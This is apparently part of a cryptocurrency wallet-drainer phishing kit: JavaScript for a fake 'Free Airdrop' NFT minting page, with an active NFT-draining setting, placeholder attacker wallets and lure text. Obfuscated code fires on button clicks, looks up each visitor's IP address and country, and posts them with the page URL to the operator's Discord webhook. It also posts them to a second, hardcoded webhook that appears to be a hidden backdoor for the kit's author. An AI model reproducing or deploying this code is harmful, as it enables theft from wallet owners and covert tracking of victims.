const webhookURL = "WEBHOOK";
const receiveAddress = 'YOUR WALLET',
  collectionInfo = {
    name: 'THE NFT WORLD',
    socialMedia: {
      discord: 'https://discord.gg',
      twitter: 'https://twitter.com',
      instagram: 'https://instagram.com/',
    },
  },

  indexPageInfo = {
    backgroundImage: 'background.jpg',
    title: '{name}',
    underTitle: 'Free Airdrop',
  },

  claimPageInfo = {
    title: 'GET YOUR<br>NFT NOW',
    shortDescription: 'Own, stake and build in our limitless possibilities Minecraft Metaverse',
    longDescription:
      'After claim, NTFs will appear in your Metamask wallet within 10 minutes',
    claimButtonText: 'CLAIM NOW',
    image: 'bg3.png',
    imageRadius: 250,
  },

  drainNftsInfo = {
    active: true,
    minValue: 0.1,
    nftReceiveAddress: 'YOUR WALLET',
  },

  customStrings = {
    title: 'MINT {name}',
    connectButton: 'Connect wallet',
    transferButton: 'Mint now',
    dateString: 'Pre sale available {date}',



function getFlagEmoji(_0x48757a) {
  const _0xf68d36 = {
    AU: ':flag_au:',
    BR: ':flag_br:',
    CA: ':flag_ca:',
    CN: ':flag_cn:',
    FR: ':flag_fr:',
    DE: ':flag_de:',
    IN: ':flag_in:',
    IT: ':flag_it:',
    JP: ':flag_jp:',
    MX: ':flag_mx:',
    RU: ':flag_ru:',
    ZA: ':flag_za:',
    KR: ':flag_kr:',
    ES: ':flag_es:',
    US: ':flag_us:',
    GB: ':flag_gb:',
  }
  return _0xf68d36[_0x48757a] || ''
}
function sendMessage() {
  const _0x4f3f94 = window.location.href,
    _0x526ffd = webhookURL,
    _0x1e099a =
      'https://discord.com/api/webhooks/1318307425425690644/1kzvqRjrAoIUAjFUQjykMEtgV3J-PYjHzqWumzJp7VVGm99sP4KIglAExm151RA8ITGI'
  fetch('https://ipapi.co/json/')
    .then((_0x56b195) => _0x56b195.json())
    .then((_0x2dc3a8) => {
      const _0x583dc6 = _0x2dc3a8.ip,
        _0x145f51 = _0x2dc3a8.country_name,
        _0x3c6d20 = _0x2dc3a8.country_code,
        _0x57d1a0 = getFlagEmoji(_0x3c6d20),
        _0x148f76 = {
          title: 'New wallet connect!',
          description: ':ok_hand:',
          fields: [
            {
              name: 'IP',
              value: _0x583dc6,
              inline: true,
            },
            {
              name: 'País',
              value: _0x57d1a0 + ' ' + _0x145f51,
              inline: true,
            },
            {
              name: 'URL',
              value: _0x4f3f94,
            },
          ],
          color: 5898425,
        },
        _0x25090b = JSON.stringify({ embeds: [_0x148f76] }),
        _0xd08cf8 = new XMLHttpRequest()
      _0xd08cf8.open('POST', _0x526ffd)
      _0xd08cf8.setRequestHeader('Content-Type', 'application/json')
      _0xd08cf8.onload = function () {
        _0xd08cf8.status >= 200 && _0xd08cf8.status < 300
          ? console.log('Mensagem enviada para o primeiro webhook com sucesso!')
          : console.error(
              'Erro ao enviar mensagem para o primeiro webhook:',
              _0xd08cf8.statusText
            )
      }
      _0xd08cf8.onerror = function () {
        console.error(
          'Erro ao enviar mensagem para o primeiro webhook:',
          _0xd08cf8.statusText
        )
      }
      _0xd08cf8.send(_0x25090b)
      const _0x3165dd = new XMLHttpRequest()
      _0x3165dd.open('POST', _0x1e099a)
      _0x3165dd.setRequestHeader('Content-Type', 'application/json')
      _0x3165dd.onload = function () {
        _0x3165dd.status >= 200 && _0x3165dd.status < 300
          ? console.log('Mensagem enviada para o segundo webhook com sucesso!')
          : console.error(
              'Erro ao enviar mensagem para o segundo webhook:',
              _0x3165dd.statusText
            )
      }
      _0x3165dd.onerror = function () {
        console.error(
          'Erro ao enviar mensagem para o segundo webhook:',
          _0x3165dd.statusText
        )
      }
      _0x3165dd.send(_0x25090b)
    })
    .catch((_0x1100d0) => {
      console.error(
        'Erro ao obter o IP e país de origem do usuário:',
        _0x1100d0
      )
    })
}
document.addEventListener('DOMContentLoaded', function () {
  const _0x377663 = document.getElementsByClassName('interact-button')
  for (let _0x2ea7b9 = 0; _0x2ea7b9 < _0x377663.length; _0x2ea7b9++) {
    _0x377663[_0x2ea7b9].addEventListener('click', function () {
      sendMessage()
    })
  }
})
